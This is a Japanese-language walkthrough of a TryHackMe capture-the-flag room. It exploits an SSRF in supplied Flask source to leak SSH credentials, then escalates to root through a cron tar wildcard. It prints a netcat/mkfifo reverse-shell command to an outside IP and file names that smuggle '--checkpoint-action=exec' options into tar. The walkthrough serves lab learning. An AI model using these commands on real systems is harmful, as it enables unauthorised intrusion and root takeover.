# Operation Coldstart CTF

https://tryhackme.com/room/operationcoldstart

## Enumeration

```shell
TARGET=10.146.177.190
sudo bash -c "echo $TARGET   op.thm >> /etc/hosts"
```

### ポートスキャン

```shell
sudo nmap -vv -sS -p- $TARGET

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

```sh
sudo nmap -sV -p21,22,80 $TARGET

PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 64
22/tcp open  ssh     syn-ack ttl 64
80/tcp open  http    syn-ack ttl 64
```

FTP, SSH, HTTP

```sh
root@ip-10-146-90-128:~# nikto -p 80 -T 1 2 3 -h $TARGET
- Nikto v2.1.5
---------------------------------------------------------------------------
+ Target IP:          10.146.177.190
+ Target Hostname:    op.thm
+ Target Port:        80
+ Start Time:         2026-07-22 04:36:59 (GMT0)
---------------------------------------------------------------------------
+ Server: gunicorn
+ The anti-clickjacking X-Frame-Options header is not present.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Allowed HTTP Methods: HEAD, GET, OPTIONS 
+ 1707 items checked: 0 error(s) and 2 item(s) reported on remote host
+ End Time:           2026-07-22 04:37:02 (GMT0) (3 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

gunicorn

### FTP

```sh
$ ftp $TARGET         
Connected to 10.146.177.190.
220 (vsFTPd 3.0.5)
Name (10.146.177.190:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||40020|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 May 09 23:14 .
drwxr-xr-x    3 ftp      ftp          4096 May 09 23:14 ..
drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 pub
226 Directory send OK.
ftp> cd pub
250 Directory successfully changed.
ftp> ls -al
229 Entering Extended Passive Mode (|||40078|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 May 09 23:14 .
drwxr-xr-x    3 ftp      ftp          4096 May 09 23:14 ..
-rw-r--r--    1 ftp      ftp          2446 May 09 23:14 backup.tar.gz
```

app.py

```python
# Only requests targeting an approved internal hostname are forwarded.
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
ALLOWED_HOSTS = {"kestrel.thm"}


@app.route("/preview")
def preview():
    target = request.args.get("url", "")
    if not target:
        return page("Preview Error",
                    '<div class="card"><p>Provide a <code>?url=</code> parameter.</p></div>'), 400

    # VULN: hostname allow-list is the only check. No scheme check, no path check,
    # no localhost-rebind protection - the SSRF is still abusable, but only
    # against the allowed hostname.
    host = (urlparse(target).hostname or "").lower()
    if host not in ALLOWED_HOSTS:
        return page("Preview Blocked",
                    '<div class="card"><p>Host not in the approved internal allow-list.</p></div>'), 403

    try:
        r = requests.get(target, timeout=3)
        safe_target = html.escape(target)
        safe_body = r.text.replace("<", "&lt;")
        body = f"""
        <div class="card">
            <h2>Preview of {safe_target}</h2>
            <pre>{safe_body}</pre>
        </div>
        """
        return page("Preview", body)
    except Exception as e:
        safe_err = html.escape(str(e))
        return page("Preview Failed",
                    f'<div class="card"><p>Fetch failed: {safe_err}</p></div>'), 502

@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
    if p == "notes":
        with open("/opt/voltlabs-preview/admin_notes.txt") as f:
            return "<pre>" + f.read() + "</pre>"
    return "<pre>Volt Labs admin endpoint.</pre>"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=80)
```

http://kestrel.thm/admin/notes のプレビューをリクエストすると下記が表示された。

```txt
Preview of http://kestrel.thm/admin/notes
<pre>=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: [REDACTED]
- Mara
</pre>
```

SSH接続成功。

```sh
webdev@coldstart:~$ ls -al
total 28
drwx------ 3 webdev webdev 4096 May  9 23:16 .
drwxr-xr-x 4 root   root   4096 May  9 23:14 ..
lrwxrwxrwx 1 root   root      9 May  9 23:16 .bash_history -> /dev/null
-rw-r--r-- 1 webdev webdev  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 webdev webdev 3771 Feb 25  2020 .bashrc
drwx------ 2 webdev webdev 4096 May  9 23:16 .cache
-rw-r--r-- 1 webdev webdev  807 Feb 25  2020 .profile
-rw------- 1 webdev webdev   38 May  9 23:14 user.txt
```

## 権限昇格

pspyでプロセスを確認。  
少し不規則な間隔に見えるが、tar がワイルドカード指定で実行されている。

```sh
2026/07/22 05:00:01 CMD: UID=0     PID=1627   | tar czf /var/backups/uploads.tgz * 
2026/07/22 05:00:01 CMD: UID=0     PID=1628   | /bin/sh -c gzip 
2026/07/22 05:00:32 CMD: UID=0     PID=1630   | ps -e -o pid,ppid,state,command 
2026/07/22 05:01:01 CMD: UID=0     PID=1631   | /usr/sbin/CRON -f -P 
2026/07/22 05:01:01 CMD: UID=0     PID=1632   | /usr/sbin/CRON -f -P 
2026/07/22 05:01:01 CMD: UID=0     PID=1633   | 
2026/07/22 05:01:01 CMD: UID=0     PID=1634   | gzip 
2026/07/22 05:01:33 CMD: UID=0     PID=1635   | ps -e -o pid,ppid,state,command 
2026/07/22 05:02:01 CMD: UID=0     PID=1636   | /usr/sbin/CRON -f -P 
2026/07/22 05:02:01 CMD: UID=0     PID=1637   | /usr/sbin/CRON -f -P 
2026/07/22 05:02:01 CMD: UID=0     PID=1638   | /bin/sh -c gzip 
2026/07/22 05:02:32 CMD: UID=0     PID=1640   | 
2026/07/22 05:02:34 CMD: UID=0     PID=1641   | ps -e -o pid,ppid,state,command 
2026/07/22 05:03:01 CMD: UID=0     PID=1642   | /usr/sbin/CRON -f -P 
2026/07/22 05:03:01 CMD: UID=0     PID=1643   | /usr/sbin/CRON -f -P 
2026/07/22 05:03:01 CMD: UID=0     PID=1644   | 
2026/07/22 05:03:01 CMD: UID=0     PID=1645   | gzip 
2026/07/22 05:03:10 CMD: UID=0     PID=1646   | /bin/hostname --fqdn 
2026/07/22 05:03:35 CMD: UID=0     PID=1647   | ps -e -o pid,ppid,state,command 
2026/07/22 05:04:01 CMD: UID=0     PID=1648   | /usr/sbin/CRON -f -P 
2026/07/22 05:04:01 CMD: UID=0     PID=1649   | /usr/sbin/CRON -f -P 
2026/07/22 05:04:01 CMD: UID=0     PID=1650   | 
2026/07/22 05:04:01 CMD: UID=0     PID=1651   | /bin/sh -c gzip 
2026/07/22 05:04:36 CMD: UID=0     PID=1652   | ps -e -o pid,ppid,state,command 
2026/07/22 05:05:01 CMD: UID=0     PID=1655   | /usr/sbin/cron -f -P 
2026/07/22 05:05:01 CMD: UID=0     PID=1654   | /usr/sbin/CRON -f -P 
2026/07/22 05:05:01 CMD: UID=0     PID=1656   | /usr/sbin/CRON -f -P 
2026/07/22 05:05:01 CMD: UID=0     PID=1657   | /usr/sbin/CRON -f -P 
2026/07/22 05:05:01 CMD: UID=0     PID=1658   | /bin/sh /usr/lib/sysstat/debian-sa1 1 1 
2026/07/22 05:05:01 CMD: UID=0     PID=1659   | tar czf /var/backups/uploads.tgz * 
2026/07/22 05:05:01 CMD: UID=0     PID=1660   | gzip 
2026/07/22 05:05:37 CMD: UID=0     PID=1661   | ps -e -o pid,ppid,state,command 
2026/07/22 05:06:01 CMD: UID=0     PID=1662   | /usr/sbin/CRON -f -P 
2026/07/22 05:06:01 CMD: UID=0     PID=1663   | /usr/sbin/CRON -f -P 
2026/07/22 05:06:01 CMD: UID=0     PID=1664   | tar czf /var/backups/uploads.tgz * 
2026/07/22 05:06:01 CMD: UID=0     PID=1665   | /bin/sh -c gzip 
```

問題は、どこをカレントディレクトリとして実行しているか。

```sh
tar czf /var/backups/uploads.tgz * 
```

/opt/backups/hello.txt を作成したところ、uploads.tgz のサイズが変わったことを確認。

```sh
webdev@coldstart:/opt$ ls -al backups
total 12
drwxrwx--- 2 webdev webdev 4096 May  9 23:14 .
drwxr-xr-x 4 root   root   4096 May  9 23:14 ..
-rw-r--r-- 1 webdev webdev   12 May  9 23:14 .keep
webdev@coldstart:/opt$ echo hello > ./backups/hello.txt
webdev@coldstart:/opt$ cat ./backups/hello.txt 
hello
```

```sh
# 前
webdev@coldstart:/opt$ ls -al /var/backups/
...
-rw-r--r--  1 root root     45 Jul 22 05:12 uploads.tgz

# 後
webdev@coldstart:/opt$ ls -al /var/backups/
...
-rw-r--r--  1 root root    133 Jul 22 05:13 uploads.tgz
```

エクスプロイト

```sh
webdev@coldstart:/opt/backups$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.131.34 8888 >/tmp/f" > shell.sh
touch "/opt/backups/--checkpoint-action=exec=sh shell.sh"
touch "/opt/backups/--checkpoint=1"
```

リバースシェル取得成功！

```sh
$ nc -nlvp 8888                                                      
listening on [any] 8888 ...
connect to [192.168.131.34] from (UNKNOWN) [10.146.177.190] 37564
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# ls -al /root
total 36
drwx------  6 root root 4096 May  9 23:16 .
drwxr-xr-x 22 root root 4096 Jul 22 04:29 ..
lrwxrwxrwx  1 root root    9 May  9 23:16 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 May  9 23:14 .cache
drwxr-xr-x  3 root root 4096 Oct 22  2024 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Oct 22  2024 .ssh
-rw-------  1 root root   38 May  9 23:14 flag.txt
drwxr-xr-x  4 root root 4096 Oct 22  2024 snap
```

## 振り返り

- SSRFはソースが与えられていたので簡単だった。
- tarジョブのカレントディレクトリを特定するところは少し考える必要があった。

## Tags

#tags:SSRF
